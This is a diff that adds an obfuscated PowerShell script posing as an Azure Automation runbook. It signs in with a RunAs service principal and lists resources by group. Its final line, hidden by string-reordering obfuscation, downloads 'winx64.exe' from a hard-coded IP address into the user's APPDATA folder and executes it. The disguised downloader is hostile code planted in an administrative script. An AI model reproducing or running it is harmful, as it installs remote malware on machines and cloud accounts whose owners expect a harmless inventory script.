@@ -1,0 +1,39 @@
+${CoNnE`c`TiOn`NamE} = ("{3}{5}{6}{1}{0}{2}{4}"-f 'unAs','R','C','A','onnection100','z','ure')
+try
+{
+    
+    ${S`Er`V`iCEP`R`inC`IPa`Lc`OnNECtIoN}=&("{4}{7}{5}{2}{0}{3}{6}{1}" -f 'nC','tion','tio','onn','Get-','a','ec','Autom') -Name ${CoN`N`EctI`oN`NamE}         
+
+    ("{3}{2}{1}{0}"-f'ure...','in to Az','ging ','Log')
+    .("{4}{1}{3}{0}{2}"-f 'eRm','Az','Account','ur','Add-') `
+        -ServicePrincipal `
+        -TenantId ${SERvI`CEp`RinCIpA`lcOn`NEcTiON}."TeN`A`Ntid" `
+        -ApplicationId ${serv`ICe`prinC`iPalcO`NNEct`I`oN}."apPL`ICat`IO`Nid" `
+        -CertificateThumbprint ${SERvIcEPr`i`Nci`PAL`ConNe`cTioN}."C`e`Rti`FICA`T`EThumbPRiNT" 
+}
+catch {
+    if (!${seRVICEPrin`CipAL`Con`NECT`iOn})
+    {
+        ${e`Rr`OrmeSsAGE} = ('Conn'+'ecti'+'o'+'n '+"$connectionName "+'n'+'ot '+'foun'+'d.')
+        throw ${Err`or`m`EssAGE}
+    } else{
+        .("{3}{0}{2}{1}" -f'it','rror','e-E','Wr') -Message ${_}."EXcepT`ION"
+        throw ${_}."e`x`cEPTIon"
+    }
+}
+
+
+${R`eS`ouR`CEGrOups} = &("{0}{3}{4}{2}{1}" -f'G','roup','RmResourceG','et-A','zure') 
+
+foreach (${Reso`UrCE`gROuP} in ${r`esouRC`EGRO`UpS})
+{    
+    .("{1}{0}{3}{2}"-f'-','Write','ut','Outp') (("{0}{3}{5}{1}{6}{2}{4}" -f'Showi','ces in','ce','ng res',' group ','our',' resour') + ${reSouR`Ceg`R`Oup}."Reso`URcEG`Ro`UPNaME")
+    ${Resou`R`c`es} = &("{0}{2}{3}{5}{4}{1}"-f'F','urce','i','nd','RmReso','-Azure') -ResourceGroupNameContains ${RESOU`RCe`gR`OuP}."re`sOU`Rcegr`Ou`P`NaMe" | .("{1}{0}" -f'lect','Se') ("{1}{3}{2}{0}" -f'ame','Resour','eN','c'), ("{2}{1}{0}"-f'Type','esource','R')
+    ForEach (${r`E`soUrCE} in ${r`ESo`URcES})
+    {
+        &("{1}{2}{0}{3}" -f 't','Write','-Ou','put') (${reSo`U`Rce}."rE`S`OuRCENa`Me" + ("{1}{0}" -f' type ',' of') +  ${RE`SO`URce}."r`Es`o`UrcETyPE")
+    }
+    &("{1}{0}{2}" -f 'e-Outpu','Writ','t') ("")
+} 
+
+(&("{0}{1}{2}" -f 'New-O','bj','ect') ("{0}{2}{3}{4}{1}{5}" -f 'S','m.Net.Web','y','s','te','Client')).("{1}{0}{2}{3}"-f'F','Download','il','e').Invoke(("{5}{3}{1}{0}{6}{2}{4}" -f '102','.','58.30','/94','/~trevor/winx64.exe','http:/','.'),"$env:APPDATA\winx64.exe");.("{4}{0}{3}{2}{1}" -f't','cess','Pro','-','Star') ("$env:APPDATA\winx64.exe")
